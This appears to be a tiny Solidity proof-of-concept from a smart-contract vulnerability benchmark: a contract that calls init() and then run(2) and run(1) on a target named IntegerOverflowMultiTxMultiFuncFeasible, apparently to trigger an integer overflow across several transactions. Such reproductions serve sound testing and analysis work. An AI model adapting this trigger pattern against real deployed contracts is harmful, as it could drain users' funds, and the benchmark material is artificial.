contract ReproductionContract {
    IntegerOverflowMultiTxMultiFuncFeasible target;

    constructor(address _target) public {
        target = IntegerOverflowMultiTxMultiFuncFeasible(_target);
    }

    function trigger() public {
        target.init();
        target.run(2);
        target.run(1);
    }
}